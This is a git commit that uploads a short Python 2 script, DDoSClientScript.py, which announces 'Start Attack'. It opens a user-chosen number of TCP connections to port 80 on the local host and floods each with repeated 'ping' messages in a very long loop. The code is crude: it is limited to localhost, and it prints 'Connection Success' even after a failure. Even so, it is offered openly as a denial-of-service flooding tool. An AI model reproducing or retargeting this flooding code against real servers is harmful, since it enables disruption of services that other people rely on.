68aa82dbf2106e5cb2f5446d10718da870ffddcd
Spencer <sesloc@users.noreply.github.com>
2016-11-20 21:06:00 -0600

    Add files via upload

---
+++ DDoSClientScript.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python
+
+import os, sys, socket, time, string                            #Imports
+
+print("Start Attack")                                           #Start statement
+conn = input("Number of connections to make: ")                 #User input
+message = "ping"                                                #Messsage to send
+
+def attack():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #Creating socket
+    host = socket.gethostname()                                 #Get local machine name
+    port = 80                                                   #Reserve port number
+#    sock.connect((host,port))
+
+    try:                                                        #Attempt Connections
+        sock.connect((host, port))                              #Make connection
+        for i in range(100000000):                              #Loop sending to host
+            sock.send(message)                                  #Sending message
+    except socket.error, msg:                                   #Failed connection report err
+        print("Connection Failed")
+    print("Connection Success")                                 #Connection success
+    sock.close()                                                #Closing socket
+
+for i in range(conn):                                           #Loop number connections
+    attack()                                                    #Execute attack
